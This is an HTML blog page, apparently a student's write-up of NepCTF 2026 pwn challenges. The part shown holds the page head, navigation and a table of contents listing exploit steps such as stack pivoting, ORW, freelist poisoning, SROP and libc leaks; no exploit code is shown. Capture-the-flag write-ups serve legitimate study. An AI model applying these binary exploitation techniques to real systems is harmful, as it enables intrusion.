@@ -1,0 +1,1199 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LMV367JHNS"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'G-LMV367JHNS');
+  </script>
+
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    NepCTF 2026 PWN | HFTTC&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="前言：最近在同学家玩，忙里偷闲打一打 nepctf，纯手搓的 wp，能不能给我个惊喜嘿嘿 ^_^ 其实打这场比赛主要是为了学一点新知识，大一结束了，转头发现其实大一也没打过什么有意思的比赛，nep 的口碑一直挺不错的，想着学习学习。开了四个 pwn 两个 re 和一个 web 还有一个 realworld，其中 realworld 和一个 re 是直接让 ai 打得，不得不感叹 ai 确实是比人强">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF 2026 PWN">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/08/05/nepctf-2026-pwn/index.html">
+<meta property="og:site_name" content="HFTTC&#39;s Blog">
+<meta property="og:description" content="前言：最近在同学家玩，忙里偷闲打一打 nepctf，纯手搓的 wp，能不能给我个惊喜嘿嘿 ^_^ 其实打这场比赛主要是为了学一点新知识，大一结束了，转头发现其实大一也没打过什么有意思的比赛，nep 的口碑一直挺不错的，想着学习学习。开了四个 pwn 两个 re 和一个 web 还有一个 realworld，其中 realworld 和一个 re 是直接让 ai 打得，不得不感叹 ai 确实是比人强">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784297436322-284c6ae3-2b4c-4ffc-8044-ec786776ebdd.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298583245-1c55bf4d-e821-40ac-ae16-59e8814d5ebc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298715295-0d09a1e4-3afb-4cb2-8d8b-42144fd4cd2d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784297814209-c3bf499e-000c-4bef-a8c5-b895c831dd4a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298321174-222e5170-1c9b-4890-a816-6d87ab6f9d27.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298422847-e4f88622-119b-4178-8b72-bd2e3f4a1f02.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298810708-79ca3638-5b82-4c6c-bd15-8b7a55fbb7b0.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298861703-74569b2f-d11b-4af1-b931-e72f055f38a9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298892881-9a948bf9-7303-4c24-b962-3dcc1ac442c6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784298926670-dc7efcfa-9b68-4c95-a357-1dc228efc59f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784299230633-391023d9-be1b-4440-b671-c4d2102f07d9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784299799493-9b9cb5d0-8530-4a62-8669-5635b2af5dea.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784300674633-8f3f8ec5-f077-4af9-a843-1889bfd9e2b4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784300891660-0dc3762e-89bf-4f9a-83ac-075da0638360.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784301488756-d9c0689f-febf-4dc0-8e5f-b82161933e0a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784301714324-4ba674f8-a256-4db0-bcaf-b148f0c654bc.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784302149722-4921a0aa-3b5f-4db5-b4f9-f9be410469c2.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784313714518-fb332500-a380-4dbb-8a3f-33070b4e96df.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784305631680-741cb418-c9c6-45c6-ad61-827e1625f91c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784313093161-a2e50ce7-8df3-4a06-bfc3-0699c007701f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784314924260-d3b523d5-d5f1-46c4-b13c-0e53e1c393f2.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784390357090-d65d83f1-99c4-40ab-aba5-16f4aae52073.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784390862670-f7e3695f-0f13-45c4-a693-89040970bf2d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784393122416-9980b619-a7ed-4dd2-a0a7-7cf604b02074.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784393057275-f11075ce-fee2-4e7a-93eb-e78e2138ef79.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784475026928-842b1c8b-cc7b-4145-9958-de63c75a1b33.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784475568943-fa192e39-3de0-4730-a210-6c70a73e8aa2.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784475630265-acccb1c2-f709-4c89-9aeb-3981cb260c81.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784476005855-ca827ddd-ea27-44d9-9171-653dac5d2d0c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784476456221-d3fb1691-1661-4717-8744-01ab82472954.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784476820086-94a5a4f4-1257-49e0-8e6b-034f4fef67c5.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784476735195-b7606d65-02be-469b-95c3-a6895fc15e4d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477134200-378c660b-2376-4816-99b0-ec40543400a7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477495306-389da22a-c3c7-44ef-a2ab-47f7d1f0e6f7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477539785-f8ad7a28-712d-43e0-b773-395da3c2e2c1.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477775003-a11ca987-9b13-4b2a-b03a-5c7167f9a545.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477908123-0a2c3e06-65d8-459a-aeb8-e03cbc5af145.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784483464198-05b956ed-a7c1-4115-b156-47e0fb8b351f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784478935713-1f179f28-8d97-48ff-adf0-835b5406a513.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784479109621-127d5ac3-5749-4b05-8b46-a5d085da4314.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784479483362-25a665fb-bfdc-4ad4-8ea1-bd16a9d02b5d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784479765546-2823b88f-c726-48cd-9fc8-8a4335711997.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784480021630-55564ad3-e64d-4ec7-9b37-29a9a3ca9d3a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784524747835-43ce7843-f123-4812-8978-07ab3a89fd16.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784480740129-dfe2c285-7b8c-4e9d-9cc1-69e890c4b8f5.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784477908123-0a2c3e06-65d8-459a-aeb8-e03cbc5af145.png?x-oss-process=image/format,webp">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784484054863-eea8e571-7d89-4f41-9818-e95218845fe6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784484303046-c605c1dd-7611-4adc-95a2-f36e77b5fba7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784484467133-bcc9def9-5327-468e-9546-474feaec8d3b.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784532017308-2bf26f0b-17b5-4300-957a-5ac2e87d423e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784534503924-ce9f4fc5-494e-41ae-8102-eefef74cb804.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784536511674-539e6e85-811c-411b-9de8-5a7cf7043711.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784536661128-dc07df75-132c-4562-a012-14fea0c3bb12.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784452237433-3b00b0f1-dafb-4023-b6aa-4cead62738ad.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538140829-80cd79f7-6224-4b50-b15b-a1e6c2f8c4ee.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538271808-5b2c1377-6a97-4abf-9416-c8458894074c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538424755-24e3fb78-1f93-4156-b2d5-2e520ec040d0.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538633434-0587e5bf-5a80-4e23-ab25-6dd18e5506cf.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784538686716-a25598d1-edb3-4ba6-afa9-b9365abf8c4f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784539834291-760fd3ce-38d8-44a9-9be0-7b3caf14a269.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784539260593-e6e895a5-d53f-44c8-80f4-4ef771ed6fc9.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784540464241-236893ec-0754-4a8a-bdee-521ba9e371c7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784540464241-236893ec-0754-4a8a-bdee-521ba9e371c7.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784542035330-bab7aa77-f0c2-4d42-bb07-34b4d9d0ae74.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784347174064-31e07aa5-24ea-4b31-b75e-d3cd38d0708f.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784349460116-0879319a-4c9b-4915-821c-70d2ad24eb59.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784304089814-e470d5e0-43cd-441b-9654-79b9888bec56.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784451404348-3db3c46b-d117-4b52-b654-2adb9b776ff4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784451438066-19b6b52e-4999-4e41-8f0c-aa9f255d2529.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784456574369-92942aa5-e965-4d11-aac6-d55115df8c24.png">
+<meta property="article:published_time" content="2026-08-05T13:30:00.000Z">
+<meta property="article:modified_time" content="2026-08-05T13:33:15.726Z">
+<meta property="article:author" content="HFTTC">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="nepctf">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/61845186/1784297436322-284c6ae3-2b4c-4ffc-8044-ec786776ebdd.png">
+    <link rel="canonical" href="https://idcm-svg.github.io/HFTTC.github.io/2026/08/05/nepctf-2026-pwn/">
+      <meta name="keywords" content="南阳理工学院, 网络安全, 软件安全, 计软, CTF, Pwn, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="HFTTC's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","name":"NepCTF 2026 PWN | HFTTC's Blog","headline":"NepCTF 2026 PWN","description":"心之所向，无问西东","url":"https://idcm-svg.github.io/HFTTC.github.io/2026/08/05/nepctf-2026-pwn/","inLanguage":"zh-CN"}</script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/catalog">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">目录</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/notice">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">公告</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/HFTTC.github.io/images/pwn/covers/nepctf-2026-pwn.jpg" alt="NepCTF 2026 PWN">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">NepCTF 2026 PWN</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#different-ROP"><span class="toc-number">1.</span> <span class="toc-text">different_ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">解题记录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">解题思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0-hexagon%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">学习 hexagon：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">IDA 静态分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-pwn-%E6%96%87%E4%BB%B6%E7%BB%93%E5%90%88%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">运行 pwn 文件结合分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87-K-%E9%A2%98"><span class="toc-number">1.2.4.</span> <span class="toc-text">准备 K 题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E5%81%9A%E4%B8%80%E4%BA%9B%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.3.1.</span> <span class="toc-text">先做一些准备工作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.3.2.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#syscall-%E8%B0%83%E7%94%A8-read"><span class="toc-number">1.3.3.</span> <span class="toc-text">syscall 调用 read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ORW"><span class="toc-number">1.3.4.</span> <span class="toc-text">ORW</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#onlyone"><span class="toc-number">2.</span> <span class="toc-text">onlyone</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">解题记录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">IDA 静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E6%89%BE%E5%88%B0-main-%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">直接找到 main 函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B2%A1%E4%BB%80%E4%B9%88%E5%8F%91%E7%8E%B0%EF%BC%8C%E5%86%8D%E5%9B%9E%E5%8E%BB%E7%9C%8B%E4%B8%80%E7%9C%8B-if%EF%BC%9A"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">没什么发现，再回去看一看 if：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%88%86%E6%9E%90-sub-14D2"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">直接分析 sub_14D2</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#add%EF%BC%9A"><span class="toc-number">2.2.1.3.1.</span> <span class="toc-text">add：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#write%EF%BC%9A"><span class="toc-number">2.2.1.3.2.</span> <span class="toc-text">write：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#free%EF%BC%9A"><span class="toc-number">2.2.1.3.3.</span> <span class="toc-text">free：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#show%EF%BC%9A"><span class="toc-number">2.2.1.3.4.</span> <span class="toc-text">show：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#poke%EF%BC%9A"><span class="toc-number">2.2.1.3.5.</span> <span class="toc-text">poke：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#trigger%EF%BC%9A"><span class="toc-number">2.2.1.3.6.</span> <span class="toc-text">trigger：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">总结一下思路：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF"><span class="toc-number">2.3.</span> <span class="toc-text">EXP 思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">2.3.1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E6%89%93%E4%B8%80%E4%B8%AA-poisoning"><span class="toc-number">2.3.2.</span> <span class="toc-text">先打一个 poisoning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1-freelist-posioning"><span class="toc-number">2.3.3.</span> <span class="toc-text">第二次 freelist posioning</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%EF%BC%9A"><span class="toc-number">2.3.4.</span> <span class="toc-text">栈迁移：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SROP%EF%BC%9A"><span class="toc-number">2.3.5.</span> <span class="toc-text">SROP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A-1"><span class="toc-number">2.4.</span> <span class="toc-text">总 EXP：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%EF%BC%9A"><span class="toc-number">2.4.1.</span> <span class="toc-text">另一种解法：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shadow-signal"><span class="toc-number">3.</span> <span class="toc-text">shadow_signal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-2"><span class="toc-number">3.1.</span> <span class="toc-text">解题记录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="toc-number">3.2.</span> <span class="toc-text">解题思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A-2"><span class="toc-number">3.2.1.</span> <span class="toc-text">IDA 静态分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#main%EF%BC%9A"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">main：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#init%EF%BC%9A"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">init：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#handler%EF%BC%9A"><span class="toc-number">3.2.1.3.</span> <span class="toc-text">handler：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A-1"><span class="toc-number">3.3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc"><span class="toc-number">3.3.1.</span> <span class="toc-text">泄露 libc</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1-SROP"><span class="toc-number">3.3.2.</span> <span class="toc-text">第一次 SROP</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ORWSROP%EF%BC%9A"><span class="toc-number">3.3.3.</span> <span class="toc-text">ORWSROP：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A-2"><span class="toc-number">3.4.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E8%AE%B0%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">杂记：</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
